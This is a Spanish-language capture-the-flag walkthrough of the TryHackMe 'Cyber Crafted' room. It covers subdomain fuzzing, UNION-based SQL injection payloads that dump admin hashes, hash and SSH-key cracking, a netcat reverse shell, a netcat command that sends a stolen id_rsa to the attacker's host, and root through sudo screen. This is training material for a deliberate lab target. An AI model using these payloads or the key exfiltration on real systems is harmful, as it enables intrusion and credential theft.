---
title : MQ|CyberCrafted|THM|SCREEN|SQL 
published : True
---


<div class="contenedor imgc">
    <img class="imgc" src="imgs/Cyber-craft/Cyber-craft0.png" style="width: 169px" alt="Cyber Craft log">
    <div> 
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Dificultad: Media</p>
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Url: <a href="https://tryhackme.com/r/room/cybercrafted" style="color: lightblue;">Cyber Crafted</a></p>
    </div>
</div>

<h2><font color="white"><center># Cyber Crafted</center></font></h2>

* Empezamos con el reconocimiento del servidor, haciéndole un ping nos damos cuenta que la maquina es Linux ya que el ttl es de proximidad a 64.

```java
# ping -c1 $target_ip
PING 10.10.87.41 (10.10.87.41) 56(84) bytes of data.
64 bytes from 10.10.87.41: icmp_seq=1 ttl=60 time=445 ms

--- 10.10.87.41 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 444.930/444.930/444.930/0.000 ms
```
* Posteriormente empezamos con nmap a investigar puertos y servicios que corre bajo estos puertos, y vemos que nos da información acerca de un subdominio,  Agregamos al /etc/hosts el subdominio encontrado: admin.cybercrafted.thm 

```java
# nmap -A $target_ip p22,80,25565

Starting Nmap 7.60 ( https://nmap.org ) at 2021-11-21 03:13 GMT
Nmap scan report for admin.cybercrafted.thm (10.10.70.248)
Host is up (0.00046s latency).

PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)
|   256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)
|_  256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (EdDSA)
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Log In
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
MAC Address: 02:62:A3:C2:8E:83 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.8 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.8 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms admin.cybercrafted.thm ($target_ip)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds

```

* Vemos que tecnologías emplead con whatweb
            
        | sudo apt-get install whatweb 

```java
# whatweb admin.cybercrafted.thm 
http://admin.cybercrafted.thm [200 OK] 
Apache[2.4.29], Country[RESERVED][ZZ], HTML5, 
HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.87.41], 
PasswordField[pwd], Title[Log In], X-UA-Compatible[IE=edge]
```


* Procedemos a verificar el dominio encontrado, y probamos credenciales por defecto, pero no tenemos éxito.

    |# admin:admin
    |# administrator:admin 
    |# admin:password
    |# 'or 1=1-- -
    |# '\|\|or 1=1-- 

* Si analiza la pagina mas afondo podemos ver que podemos ejecutar un XSS.

<img src="imgs/Cyber-craft/Cyber-craft3.png">

* Procedemos a hacer un ataque de fuerza bruta sa subdominios existentes con gobuster.

```java
#  wfuzz --hc=400,302 -c -f domains -w /usr/share/wordlists/dirb/common.txt -u "http://$target_ip" -H "Host: FUZZ.cybercrafted.thm"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.87.41/
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                 
=====================================================================

000000288:   200        30 L     64 W       937 Ch      "ADMIN"                                                                                                 
000000287:   200        30 L     64 W       937 Ch      "Admin"                                                                                                 
000000286:   200        30 L     64 W       937 Ch      "admin"                                                                                                 
000003856:   403        9 L      28 W       287 Ch      "store"                                                                                                 
000004531:   200        34 L     71 W       832 Ch      "www"                                                                                                   

Total time: 230.8766
Processed Requests: 4614
Filtered Requests: 4609
Requests/sec.: 19.98469
```
* Agregamos los subdominios encontrados al /etc/hosts tal que quede de la siguiente manera.

<img src="imgs/Cyber-craft/Cyber-craft2.png">

* Posterior mente vamos a http://store.cybercrafted.thm/, no hay nada o eso nos quieren hacer pensar.. 

<img src="imgs/Cyber-craft/Cyber-craft4.png">
    
* Hacemos fuzzing bajo este dominio y encontramos algunas cosa interesantes, como search.php


```java
# gobuster -t 100 dir -u http://store.cybercrafted.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.cybercrafted.thm/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/search.php           (Status: 200) [Size: 838]
/.php                 (Status: 403) [Size: 287]
/assets               (Status: 301) [Size: 333] [--> http://store.cybercrafted.thm/assets/]
```

* Vemos que es vulnerable a inyección Sql.

<img src="imgs/Cyber-craft/Cyber-craft5.png">

* Extraemos el nombre de las tablas

        'union select NULL,NULL,NULL,table_name from information_schema.tables -- -

<img src="imgs/Cyber-craft/Cyber-craft6.png">

* Extraemos las columnas.

        'union select NULL,NULL,NULL,column_name from information_schema.columns where table_name='admin'-- -


<img src="imgs/Cyber-craft/Cyber-craft8.png">

* Extraemos la información de esas columnas.

        ' union select NULL,NULL,NULL,group_concat(user, hash) FROM admin-- -

<img src="imgs/Cyber-craft/Cyber-craft9.png">

* Buscamos ese hash encriptado en crackstation.net

<img src="imgs/Cyber-craft/Cyber-craft10.png">

* Que hacemos? pues ingresar con las credenciales!, ganamos acceso.

<img src="imgs/Cyber-craft/Cyber-craft11.png">

* Hacemos tratamiento a la concha para tener una tty.

        script /dev/null -c bash
        ctrl + z
        stty raw -echo && fg
        reset xterm
        export SHELL=bash
        export TERM=xterm
        stty rows 34 columns 169 # Haga stty -a desde su terminal para ver la cantidad de columnas y filas

```java
# nc -nlvp 444
listening on [any] 444 ...
connect to [10.17.21.18] from (UNKNOWN) [10.10.87.41] 59174
bash: cannot set terminal process group (1054): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cybercrafted:/var/www/admin$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@cybercrafted:/var/www/admin$ ^Z
zsh: suspended  nc -nlvp 444
# stty raw -echo && fg
[1]  + continued  nc -nlvp 444
                              reset xterm

```

* Empezamos a enumerar usuarios y ver el directorio ssh

<img src="imgs/Cyber-craft/Cyber-craft12.png">

* Capturamos la id_rsa encriptada y la pasamos a nuestro entorno de trabajo, para desencriptarla.

<img src="imgs/Cyber-craft/Cyber-craft13.png">

* Podemos pasar el archivo copiando y pegando pero como estamos practicando vamos a transferirlo por netcat(nc).

        nc MY_IP 4443 -q 0 < id_rsa # -q 0 hace que cuando se trasfiera el archivo se cierre la conexión automáticamente.
        nc -nlvp 4443 > id_rsa # Desde su maquina trasfiere el archivo recibido a uno llamado id_rsa

<img src="imgs/Cyber-craft/Cyber-craft14.png">


* Usamos ssh2john para desencriptar esta rsa, y procedemos a desencriptarla teniendo éxito.


```java
# ssh2john id_rsa > hash
# john -wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
########      (id_rsa)     
1g 0:00:00:00 DONE (2024-11-17 04:59) 1.298g/s 2462Kp/s 2462Kc/s 2462KC/s creepygoblin..creeep
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

* Otorgamos permisos al id_rsa y nos conectamos con la credencial posteriormente descifrada.

```java
# chmod 600 id_rsa
# ssh xxultimatecreeperxx@$target_ip -i id_rsa
The authenticity of host '10.10.87.41 (10.10.87.41)' can't be established.
ED25519 key fingerprint is SHA256:ebA122u0ERUidN6lFg44jNzp3OoM/U4Fi4usT3C7+GM.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: [hashed name]
    ~/.ssh/known_hosts:7: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.87.41' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
```

* Vemos que pertenecemos a un grupo 'minecraft'.

```java
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ uname -a
Linux cybercrafted 4.15.0-159-generic #167-Ubuntu SMP Tue Sep 21 08:55:05 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

xxultimatecreeperxx@cybercrafted:/opt/minecraft$ id
uid=1001(xxultimatecreeperxx) gid=1001(xxultimatecreeperxx) groups=1001(xxultimatecreeperxx),25565(minecraft)
```

* Procedemos a buscar rutas con este grupo, vemos una flag y demas cosas en /opt/minecraft

        find / -type f -group minecraft 2>/dev/null | more

<img src="imgs/Cyber-craft/Cyber-craft17.png">


* En /opt/minecraft hay algo interesante un archivo llamado note.txt en el que se habla de un nuevo plugin.

```java
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cat note.txt 
Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
- cybercrafted

P.S
Will remove the whitelist soon.
```

* Y en mas adelante en el directorio /opt/minecraft/plugins/LoginSystem/log.txt vemos una credenciales de un usuario que esta contemplado en nuestro sistema.

```java
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat log.txt ; echo

[2021/06/27 11:25:07] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:25:16] cybercrafted registered. PW: ############
[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:47:34] cybercrafted logged in. PW: ############
[2021/06/27 11:52:13] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:57:29] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:57:54] cybercrafted logged in. PW: ############
[2021/06/27 11:58:38] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:58:46] cybercrafted logged in. PW: ############
[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:59:01] madrinch logged in. PW:  ############


[2021/10/15 17:13:45] [BUKKIT-SERVER] Startet LoginSystem!
[2021/10/15 20:36:21] [BUKKIT-SERVER] Startet LoginSystem!
[2021/10/15 21:00:43] [BUKKIT-SERVER] Startet LoginSystem!
[2024/11/17 07:28:54] [BUKKIT-SERVER] Startet LoginSystem!
```

* Comprobamos que el usuario cybercraft este verdaderamente contemplado en el sistema.

```java
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
xxultimatecreeperxx:x:1001:1001:,,,:/home/xxultimatecreeperxx:/bin/bash
cybercrafted:x:1002:1002:,,,:/home/cybercrafted:/bin/bash
```

* Nos conectamos como cybercraft con la credencial encontrada.

```java
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ su cybercrafted
Password: ******************
cybercrafted@cybercrafted:/opt/minecraft$ whoami
cybercrafted
```

* Vemos que podemos comando podemos correr como root con este usuario.

```java
cybercrafted@cybercrafted:/opt/minecraft$ sudo -l
Matching Defaults entries for cybercrafted on cybercrafted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted
```

* Si investiga mas hacer del comando screen se dará cuenta que puede tener una shell a la hora de correr el comando 
sudo /usr/bin/screen -r cybercrafted, procedemos entonces a correr el binario y hacer ctrl + a + c para tener una shell como root que es el que esta corriendo este binario (screen).

        Ctrl + a + c

<img src="imgs/Cyber-craft/Cyber-craft20.png">

